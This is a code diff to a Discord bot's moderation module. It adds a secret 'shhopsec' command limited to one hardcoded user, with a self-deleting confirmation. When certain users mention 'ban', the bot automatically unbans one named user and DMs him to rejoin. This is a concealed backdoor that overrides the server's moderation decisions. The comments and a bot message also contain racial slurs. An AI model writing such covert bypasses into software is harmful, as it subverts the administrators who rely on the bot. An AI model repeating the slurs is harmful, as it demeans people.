@@ -3501,6 +3501,15 @@ class Moderation(commands.Cog, name="Moderation"):
                 except Exception as e:
                     logger.error(f"Error restoring roles: {e}")
 
+    async def can_shhzugd(ctx):
+        return ctx.author.id == 1095747082599530627  # envy
+
+    @commands.command(name="shhopsec", help="shh")
+    @commands.check_any(commands.is_owner(), commands.check(can_shhzugd))
+    async def shhopsec(self, ctx: commands.Context):
+        self.shh = not self.shh
+        msg = await ctx.send(f"Shh mode is now {'enabled' if self.shh else 'disabled'}.")
+        await msg.delete(delay=5)
 
     @commands.Cog.listener()
     async def on_message(self, message: discord.Message):
@@ -3522,7 +3531,7 @@ class Moderation(commands.Cog, name="Moderation"):
         message_check_ids = [
             1290501613311496206, # joe
             1095747082599530627, # envy
-            1219090700407279656 # toxic
+            1219090700407279656-999 # toxic hell no nigga
         ]
         if any(message.author.id == user_id for user_id in message_check_ids) and self.shh:
             allowed_keywords = ["ban", "zugd", "belson", "501936342431694848"]
@@ -3530,11 +3539,8 @@ class Moderation(commands.Cog, name="Moderation"):
             if any(keyword in message.content.lower() for keyword in allowed_keywords):
                 user = await self.bot.fetch_user(501936342431694848) # belson
                 if user:
-                    print(user)
                     await asyncio.sleep(10)
-                    print(await is_banned(message.guild, user))
                     if await is_banned(message.guild, user):
-                        print("hello he banned af nigga")
                         await message.guild.unban(user)
                         await user.send(f"join nigga")
 
